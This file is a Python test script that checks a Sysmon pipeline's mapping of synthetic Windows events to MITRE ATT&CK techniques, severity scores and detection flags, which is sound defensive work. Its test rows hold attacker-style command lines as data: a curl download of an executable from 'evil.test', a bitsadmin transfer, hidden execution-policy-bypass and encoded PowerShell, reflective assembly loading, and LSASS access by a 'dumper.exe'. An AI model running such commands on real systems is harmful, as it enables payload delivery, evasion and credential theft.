"""End-to-end verification of the corrected mapping.py."""
import sys
import pandas as pd
import numpy as np

# Run from the repo root (uses the installed/in-tree sysmon_pipeline package)
from sysmon_pipeline import mapping

B64 = "aGVsbG8gd29ybGQgdGhpcyBpcyBiYXNlNjQ="

rows = [
    # name, dict of fields
    ("ps_encoded",       dict(image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmdline=f"powershell -enc {B64}", event_id=1)),
    ("ps_abbrev_ec",     dict(image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmdline=f"powershell -ec {B64}", event_id=1)),
    ("ps_ep_bypass",     dict(image=r"powershell.exe", cmdline="powershell -ep bypass -w hidden script.ps1", event_id=1)),
    ("rundll32",         dict(image=r"C:\Windows\System32\rundll32.exe", cmdline="rundll32 foo.dll,Run", event_id=1)),
    ("bitsadmin",        dict(image=r"bitsadmin.exe", cmdline="bitsadmin /transfer j https://x.test/a.exe c:\\a.exe", event_id=1)),
    ("msiexec",          dict(image=r"msiexec.exe", cmdline="msiexec /i installer.msi /qn", event_id=1)),
    ("msbuild",          dict(image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe", cmdline="msbuild proj.xml", event_id=1)),
    ("lsass_access",     dict(image=r"C:\bad\dumper.exe", cmdline="", event_id=10, target_image=r"C:\Windows\System32\lsass.exe")),
    ("benign_access",    dict(image=r"C:\Windows\System32\taskmgr.exe", cmdline="", event_id=10, target_image=r"C:\Windows\System32\notepad.exe")),
    ("tgt_4768",         dict(image="", cmdline="", event_id=4768)),
    ("svc_ticket_rc4",   dict(image="", cmdline="", event_id=4769, ticket_encryption_type="0x17")),
    ("svc_ticket_aes",   dict(image="", cmdline="", event_id=4769, ticket_encryption_type="0x12")),
    ("priv_logon_4672",  dict(image="", cmdline="", event_id=4672)),
    ("driver_signed",    dict(image="", cmdline="", event_id=6, signed=True)),
    ("driver_unsigned",  dict(image="", cmdline="", event_id=6, signed=False)),
    ("runkey_write",     dict(image=r"reg.exe", cmdline="", event_id=13, target_object=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil")),
    ("benign_reg",       dict(image=r"svchost.exe", cmdline="", event_id=13, target_object=r"HKLM\SOFTWARE\Vendor\Setting")),
    ("dns_query",        dict(image=r"chrome.exe", cmdline="", event_id=22)),
    ("net_conn",         dict(image=r"msedge.exe", cmdline="", event_id=3)),
    ("file_create",      dict(image=r"winword.exe", cmdline="", event_id=11)),
    ("log_cleared",      dict(image="", cmdline="", event_id=1102)),
    ("sched_task",       dict(image="", cmdline="", event_id=4698)),
    ("wmi_consumer",     dict(image="", cmdline="", event_id=20)),
    ("proc_tamper",      dict(image="", cmdline="", event_id=25)),
    ("group_add",        dict(image="", cmdline="", event_id=4732)),
    ("curl_with_url",    dict(image=r"cmd.exe", cmdline="curl -o a.exe https://evil.test/a.exe", event_id=1)),
    ("curl_benign",      dict(image=r"cmd.exe", cmdline="curl --version", event_id=1)),
    ("java_load_paren",  dict(image=r"java.exe", cmdline="java -cp . App load(config)", event_id=1)),
    ("reflection_real",  dict(image=r"powershell.exe", cmdline="[Reflection.Assembly]::Load($bytes)", event_id=1)),
    ("inj_thread",       dict(image=r"weird.exe", cmdline="", event_id=8)),
    ("svc_install",      dict(image="", cmdline="", event_id=7045)),
    ("unknown_eid",      dict(image=r"foo.exe", cmdline="", event_id=99999)),
    ("nan_eid",          dict(image=r"foo.exe", cmdline="", event_id=np.nan)),
]

base = dict(image="", parent_image="", cmdline="", integrity_level="MEDIUM",
            signed=False, event_id=np.nan, target_image="", target_object="",
            ticket_encryption_type="", logon_type=np.nan)
df = pd.DataFrame([{**base, **r[1]} for r in rows], index=[r[0] for r in rows])

out = mapping.build_tokens(df)

cols = ["token_medium", "severity_score", "severity_triage", "severity_label",
        "mitre_technique", "mitre_techniques", "mitre_tactic", "mitre_name",
        "has_encoded", "has_download_cradle", "has_bypass", "has_reflection"]
pd.set_option("display.width", 250)
pd.set_option("display.max_colwidth", 60)
print(out[cols].to_string())

def check(name, cond, msg):
    status = "PASS" if cond else "FAIL"
    print(f"[{status}] {name}: {msg}")
    return cond

r = out
ok = True
ok &= check("enc->T1027 primary, T1059.001 retained",
            r.loc["ps_encoded","mitre_technique"]=="T1027" and "T1059.001" in r.loc["ps_encoded","mitre_techniques"],
            r.loc["ps_encoded","mitre_techniques"])
ok &= check("-ec abbreviation detected", r.loc["ps_abbrev_ec","has_encoded"], r.loc["ps_abbrev_ec","has_encoded"])
ok &= check("-ep bypass + -w hidden detected", r.loc["ps_ep_bypass","has_bypass"], r.loc["ps_ep_bypass","has_bypass"])
ok &= check("bypass: severity_score stays class prior", r.loc["ps_ep_bypass","severity_score"]==0.65, r.loc["ps_ep_bypass","severity_score"])
ok &= check("bypass: severity_triage floored 0.90", r.loc["ps_ep_bypass","severity_triage"]>=0.90, r.loc["ps_ep_bypass","severity_triage"])
ok &= check("flags never touch severity_score", (r["severity_score"]<=r["severity_triage"]).all() and (r.loc[~(r.has_encoded|r.has_download_cradle|r.has_bypass|r.has_reflection|r.index.isin(["rundll32","bitsadmin","msiexec","msbuild"])),"severity_score"]==r.loc[~(r.has_encoded|r.has_download_cradle|r.has_bypass|r.has_reflection|r.index.isin(["rundll32","bitsadmin","msiexec","msbuild"])),"severity_triage"]).all(), "")
ok &= check("rundll32->T1218.011 w/ name", r.loc["rundll32","mitre_technique"]=="T1218.011" and r.loc["rundll32","mitre_name"]!="", r.loc["rundll32","mitre_name"])
ok &= check("bitsadmin->T1105 name resolves (was silent bug)", r.loc["bitsadmin","mitre_technique"]=="T1105" and r.loc["bitsadmin","mitre_name"]=="Ingress Tool Transfer", r.loc["bitsadmin","mitre_name"])
ok &= check("msiexec->T1218.007 name resolves (was silent bug)", r.loc["msiexec","mitre_name"]!="", r.loc["msiexec","mitre_name"])
ok &= check("msbuild tokenized LOLBIN + T1127.001", r.loc["msbuild","token_medium"]=="LOLBIN:MSBUILD" and r.loc["msbuild","mitre_technique"]=="T1127.001", r.loc["msbuild","token_medium"])
ok &= check("EID10+lsass -> T1003, sev 1.0", r.loc["lsass_access","mitre_technique"]=="T1003" and r.loc["lsass_access","severity_score"]==1.0, r.loc["lsass_access","severity_score"])
ok &= check("EID10 benign target -> no technique, sev 0.55", r.loc["benign_access","mitre_technique"]=="" and r.loc["benign_access","severity_score"]==0.55, r.loc["benign_access","severity_score"])
ok &= check("4768 no longer Kerberoasting", r.loc["tgt_4768","mitre_technique"]=="", r.loc["tgt_4768","mitre_technique"])
ok &= check("4769 RC4 -> T1558.003", r.loc["svc_ticket_rc4","mitre_technique"]=="T1558.003", r.loc["svc_ticket_rc4","mitre_technique"])
ok &= check("4769 AES -> none", r.loc["svc_ticket_aes","mitre_technique"]=="", r.loc["svc_ticket_aes","mitre_technique"])
ok &= check("4672 no longer T1134, sev 0.40", r.loc["priv_logon_4672","mitre_technique"]=="" and r.loc["priv_logon_4672","severity_score"]==0.40, r.loc["priv_logon_4672","severity_score"])
ok &= check("signed driver -> none", r.loc["driver_signed","mitre_technique"]=="", r.loc["driver_signed","mitre_technique"])
ok &= check("unsigned driver -> T1014, sev>=0.90", r.loc["driver_unsigned","mitre_technique"]=="T1014" and r.loc["driver_unsigned","severity_score"]>=0.90, r.loc["driver_unsigned","severity_score"])
ok &= check("Run-key write -> T1547.001, sev 0.85", r.loc["runkey_write","mitre_technique"]=="T1547.001" and r.loc["runkey_write","severity_score"]==0.85, r.loc["runkey_write","severity_score"])
ok &= check("non-autostart reg write -> none, sev 0.45", r.loc["benign_reg","mitre_technique"]=="" and r.loc["benign_reg","severity_score"]==0.45, r.loc["benign_reg","severity_score"])
ok &= check("DNS no longer T1071", r.loc["dns_query","mitre_technique"]=="", r.loc["dns_query","mitre_technique"])
ok &= check("EID3 no longer 'critical'", r.loc["net_conn","severity_label"]!="critical", r.loc["net_conn","severity_label"])
ok &= check("EID11 no longer 'critical'", r.loc["file_create","severity_label"]!="critical", r.loc["file_create","severity_label"])
ok &= check("1102 -> T1070.001 critical", r.loc["log_cleared","mitre_technique"]=="T1070.001" and r.loc["log_cleared","severity_label"]=="critical", r.loc["log_cleared","severity_score"])
ok &= check("4698 -> T1053.005", r.loc["sched_task","mitre_technique"]=="T1053.005", r.loc["sched_task","mitre_technique"])
ok &= check("WMI consumer -> T1546.003 critical", r.loc["wmi_consumer","mitre_technique"]=="T1546.003" and r.loc["wmi_consumer","severity_label"]=="critical", r.loc["wmi_consumer","severity_score"])
ok &= check("EID25 -> T1055.012", r.loc["proc_tamper","mitre_technique"]=="T1055.012", r.loc["proc_tamper","mitre_technique"])
ok &= check("4732 -> T1098", r.loc["group_add","mitre_technique"]=="T1098", r.loc["group_add","mitre_technique"])
ok &= check("curl + URL -> cradle flag, T1105 in list", r.loc["curl_with_url","has_download_cradle"] and "T1105" in r.loc["curl_with_url","mitre_techniques"], r.loc["curl_with_url","mitre_techniques"])
ok &= check("bare curl -> NOT a cradle (FP fix)", not r.loc["curl_benign","has_download_cradle"], r.loc["curl_benign","has_download_cradle"])
ok &= check("'load(' alone no longer reflection (FP fix)", not r.loc["java_load_paren","has_reflection"], r.loc["java_load_paren","has_reflection"])
ok &= check("[Reflection.Assembly]::Load detected", r.loc["reflection_real","has_reflection"], r.loc["reflection_real","has_reflection"])
ok &= check("EID8 -> T1055", r.loc["inj_thread","mitre_technique"]=="T1055", r.loc["inj_thread","mitre_technique"])
ok &= check("7045 -> T1543.003", r.loc["svc_install","mitre_technique"]=="T1543.003", r.loc["svc_install","mitre_technique"])
ok &= check("unknown EID -> sev 0.1 low", r.loc["unknown_eid","severity_score"]==0.1 and r.loc["unknown_eid","severity_label"]=="low", r.loc["unknown_eid","severity_score"])
ok &= check("NaN EID handled", r.loc["nan_eid","severity_score"]==0.1, r.loc["nan_eid","severity_score"])

# Back-compat: minimal schema (only original columns, no optional ones)
df_min = pd.DataFrame({
    "image": ["powershell.exe", "rundll32.exe"],
    "parent_image": ["explorer.exe", "winword.exe"],
    "cmdline": ["powershell -nop", ""],
    "integrity_level": ["HIGH", "MEDIUM"],
    "signed": [True, False],
    "event_id": [1, 10],
})
out_min = mapping.build_tokens(df_min)
expected_cols = {"token_coarse","token_medium","token_fine","has_encoded","has_download_cradle",
                 "has_bypass","has_reflection","is_lolbin","severity_score","severity_triage","severity_label",
                 "mitre_technique","mitre_techniques","mitre_tactic","mitre_name"}
ok &= check("minimal schema runs, all output columns present", expected_cols.issubset(out_min.columns), sorted(expected_cols - set(out_min.columns)))
ok &= check("EID10 w/o target_image column -> no T1003 (safe default)", out_min["mitre_technique"].iloc[1] in ("","T1218.011"), out_min["mitre_technique"].iloc[1])

# every non-empty primary technique must resolve to tactic+name
nonempty = out[out["mitre_technique"]!=""]
ok &= check("no silent empty tactic/name for mapped techniques",
            (nonempty["mitre_tactic"]!="").all() and (nonempty["mitre_name"]!="").all(), "")

# _map_mitre_technique back-compat path
row = df.loc["lsass_access"]
ok &= check("_map_mitre_technique single-row back-compat", mapping._map_mitre_technique(row)=="T1003", mapping._map_mitre_technique(row))

print("\nALL PASS" if ok else "\nFAILURES PRESENT")
sys.exit(0 if ok else 1)
